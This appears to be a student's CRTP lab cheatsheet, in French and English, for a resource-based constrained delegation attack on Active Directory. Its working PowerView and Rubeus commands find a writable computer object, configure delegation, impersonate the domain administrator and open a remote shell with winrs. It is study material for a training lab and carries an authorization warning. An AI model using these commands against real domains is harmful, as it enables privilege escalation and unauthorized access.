# Cheatsheet - RBCD

> [!summary] Objectif
> Préparer le workflow RBCD du PDF : identify write rights, set RBCD, verify, then chain with Rubeus.

> [!warning] Cadre d'utilisation
> À utiliser uniquement dans un environnement de lab autorisé, dans le cadre de l'apprentissage et de la préparation CRTP.

## Quick use

- `GenericWrite` on computer object
- `Set-DomainRBCD`
- `Get-DomainRBCD`
- `Rubeus s4u`

## Core commands

### Find the write path

```powershell
. C:\AD\Tools\PowerView.ps1
Find-InterestingDomainACL | Where-Object {$_.IdentityReferenceName -match 'ciadmin'}
```

Le lab manual part d’un droit `GenericWrite` sur `dcorp-mgmt`.

### Configure RBCD

```powershell
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
Get-DomainRBCD
```

Bloc exact du support pour écrire puis vérifier la delegation.

### Abuse with Rubeus

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe args s4u /user:dcorp-studentX$ /aes256:<AES256_KEY> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
winrs -r:dcorp-mgmt cmd
```

Le PDF enchaîne ensuite avec `s4u` puis `winrs` pour vérifier l’accès obtenu.

## PDF notes

- Le support récupère d’abord les clés machine de la student VM avant le `s4u`.
- Note séparément : object controlled, delegated machine, SPN target, user impersonated.

## Related

- [[Cheatsheet - Delegation attacks]]
- [[Cheatsheet - Lateral movement]]
- [[Cheatsheet - Trusts et forêts]]
